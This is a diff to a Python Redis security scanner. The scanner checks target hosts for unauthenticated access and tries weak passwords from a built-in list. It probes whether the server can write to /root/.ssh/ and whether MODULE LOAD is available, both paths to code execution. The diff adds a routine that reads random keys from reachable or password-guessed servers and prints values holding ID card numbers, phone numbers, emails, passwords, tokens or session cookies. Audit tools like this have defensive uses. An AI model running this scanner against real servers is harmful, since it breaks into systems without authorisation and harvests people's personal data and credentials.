@@ -1,13 +1,137 @@
 # -*- coding: utf-8 -*-
 # author: xiwu
 # description: check redis for unauth, slave-rce, weak_pass
+# todo: sensitive information check in redis keys
 
 import socket
 import sys
 import argparse
+import re
 
 # 默认内置字典
 weak_pass_dict = ['admin', '123456', 'foobared']
+
+# 敏感信息关键字
+sensitive_keyword = [
+    'password', 'passwd', 'username', 'cookie', 'session', 'token'
+]
+
+
+# 判断是否为邮箱
+def is_email(string):
+    emails = re.findall(r'[a-z0-9A-Z_]{1,19}@[0-9a-zA-Z]{1,13}\.[a-z]{1,6}',
+                        string)
+    if emails != ['']:
+        return emails
+    else:
+        return False
+
+
+# 判断是否为手机号
+def is_phone(string):
+    iphones = re.findall(
+        r'((13[0-9]|14[5-9]|15[012356789]|166|17[0-8]|18[0-9]|19[8-9])[0-9]{8})',
+        string)
+    res = []
+    if iphones != []:
+        for i in iphones:
+            lens = string.find(i[0])
+            if (string[lens - 1:lens].isdigit()) or (string[lens + 11:lens +
+                                                            12].isdigit()):
+                pass
+            else:
+                res.append(i[0])
+        if res != []:
+            return res
+        else:
+            return False
+    else:
+        return False
+
+
+# 判断是否为身份证号
+def is_id_card(string):
+    coefficient = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
+    parityBit = '10X98765432'
+    idcards = re.findall(
+        r'([1-9]\d{5}[1-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])((\d{4})|\d{3}[xX]))',
+        string)
+    res = []
+    if idcards != []:
+        for idcard in idcards:
+            sumnumber = 0
+            for i in range(17):
+                sumnumber += int(idcard[0][i]) * coefficient[i]
+            if parityBit[sumnumber % 11] == idcard[0][-1]:
+                res.append(idcard[0])
+        if res != []:
+            return res
+        else:
+            return False
+    else:
+        return False
+
+
+# 搜索敏感关键词
+def search_keyword(string):
+    for each in sensitive_keyword:
+        if re.search(each, string, flags=re.IGNORECASE):
+            return True
+    return False
+
+
+# 随机取key检查value是否包含敏感信息
+def find_sensitive_info(ip, port, *args):
+    socket.setdefaulttimeout(5)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, int(port)))
+    except Exception as e:
+        print(e)
+        return False
+    if args:
+        passwd = args[0]
+        s.send(('*2\r\n$4\r\nAUTH\r\n$%s\r\n%s\r\n' %
+                (len(passwd), passwd)).encode('utf-8'))
+        s.recv(1024)
+    s.send('*1\r\n$9\r\nRANDOMKEY\r\n'.encode('UTF-8'))
+    response = s.recv(1024)
+
+    # 判断是否为空
+    if '-1' in response.decode('utf-8', 'ignore'):
+        print('no keys')
+        return False
+    # 提取Key的值
+    key_name = re.findall(b'\r\n(.*?)\r\n', response)[0].decode('utf-8', 'ignore')
+
+    # print(key_name)
+    # print('*2\r\n$3\r\nGET\r\n${key_length}\r\n{key}\r\n'.format(key_length=len(key_name),key=key_name))
+    s.send(('*2\r\n$3\r\nGET\r\n${key_length}\r\n{key}\r\n'.format(
+        key_length=len(key_name), key=key_name)).encode('UTF-8'))
+    response = s.recv(1024)
+    s.close()
+
+    key_value = response.decode('utf-8', 'ignore')
+    # print(key_value)
+    
+    # 判断value
+    # 匹配id card number
+    id_card = is_id_card(key_value)
+
+    # 匹配mobile
+    mobile = is_phone(key_value)
+
+    # 匹配email
+    email = is_email(key_value)
+
+    # 判断key name，搜索敏感词
+    sen_kw = search_keyword(key_name)
+
+    if id_card or mobile or email or sen_kw:
+        print(key_name + ': ' + key_value)
+        return key_name + ': ' + key_value
+    else:
+        return False
 
 
 def connect_test(ip, port):
@@ -27,7 +151,11 @@ def unauth_check(ip, port):
     try:
         socket.setdefaulttimeout(5)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, int(port)))
+        try:
+            s.connect((ip, int(port)))
+        except Exception as e:
+            print(e)
+            return False
         s.send('*1\r\n$4\r\nINFO\r\n'.encode('UTF-8'))
         response = s.recv(1024)
         s.close()
@@ -58,7 +186,11 @@ def find_weak_pwd(ip, port):
     print('attempt to find weak password：')
     socket.setdefaulttimeout(5)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, int(port)))
+    try:
+        s.connect((ip, int(port)))
+    except Exception as e:
+        print(e)
+        return False
     for pass_ in weak_pass_dict:
         s.send(("*2\r\n$4\r\nAUTH\r\n$%s\r\n%s\r\n" %
                 (len(pass_), pass_)).encode('UTF-8'))
@@ -75,11 +207,16 @@ def find_weak_pwd(ip, port):
 def privilege(ip, port, *args):
     socket.setdefaulttimeout(5)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, int(port)))
+    try:
+        s.connect((ip, int(port)))
+    except Exception as e:
+        print(e)
+        return False
     if args:
         passwd = args[0]
         s.send(('*2\r\n$4\r\nAUTH\r\n$%s\r\n%s\r\n' %
                 (len(passwd), passwd)).encode('utf-8'))
+        s.recv(1024)
     s.send(
         '*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\nDIR\r\n$11\r\n/root/.ssh/\r\n'
         .encode('UTF-8'))
@@ -100,11 +237,16 @@ def privilege(ip, port, *args):
 def slave_rce(ip, port, *args):
     socket.setdefaulttimeout(5)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, int(port)))
+    try:
+        s.connect((ip, int(port)))
+    except Exception as e:
+        print(e)
+        return False
     if args:
         passwd = args[0]
         s.send(('*2\r\n$4\r\nAUTH\r\n$%s\r\n%s\r\n' %
                 (len(passwd), passwd)).encode('utf-8'))
+        s.recv(1024)
     s.send('*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$3\r\n123\r\n'.encode('UTF-8'))
     response = s.recv(1024)
     s.close()
@@ -183,12 +325,16 @@ if __name__ == '__main__':
             PASSWD = 'NOT_FOUND'
             M_S_RCE = 'NO_M_S_RCE'
             PRIVILEGE = 'ROOT'
+            SENSITIVE_INFO = 'NO_SENSITIVE_INFO'
             ip = each.split(',')[0].strip('"')
             port = int(each.split(',')[1].strip('"'))
             if connect_test(ip, port):
                 flag = unauth_check(ip, port)
                 if flag == 1:
                     UNAUTH = 'UNAUTH'
+                    res = find_sensitive_info(ip, port)
+                    if res:
+                        SENSITIVE_INFO = res
                     if not privilege(ip, port):
                         PRIVILEGE = 'NO_ROOT'
                         if slave_rce(ip, port):
@@ -196,6 +342,9 @@ if __name__ == '__main__':
                 elif flag == 0:
                     passwd = find_weak_pwd(ip, port)
                     if passwd:
+                        res = find_sensitive_info(ip, port, passwd)
+                        if res:
+                            SENSITIVE_INFO = res
                         PASSWD = passwd
                         if not privilege(ip, port, passwd):
                             if slave_rce(ip, port, passwd):
@@ -211,13 +360,14 @@ if __name__ == '__main__':
                         pass
                     else:
                         f.write(
-                            '{ip}:{port}, {UNAUTH}, password:{PASSWD}, {PRIVILEGE}, {M_S_RCE}\n'
+                            '{ip}:{port}, {UNAUTH}, password:{PASSWD}, {PRIVILEGE}, {M_S_RCE}, {SENSITIVE_INFO}\n'
                             .format(ip=ip,
                                     port=str(port),
                                     UNAUTH=UNAUTH,
                                     PASSWD=PASSWD,
                                     PRIVILEGE=PRIVILEGE,
-                                    M_S_RCE=M_S_RCE))
+                                    M_S_RCE=M_S_RCE,
+                                    SENSITIVE_INFO=SENSITIVE_INFO))
 
     else:
         ip = args.host
@@ -225,11 +375,13 @@ if __name__ == '__main__':
         if connect_test(ip, port):
             flag = unauth_check(ip, port)
             if flag == 1:
+                find_sensitive_info(ip, port)
                 if not privilege(ip, port):
                     slave_rce(ip, port)
             elif flag == 0:
                 passwd = find_weak_pwd(ip, port)
                 if passwd:
+                    find_sensitive_info(ip, port, passwd)
                     if not privilege(ip, port, passwd):
                         slave_rce(ip, port, passwd)
 
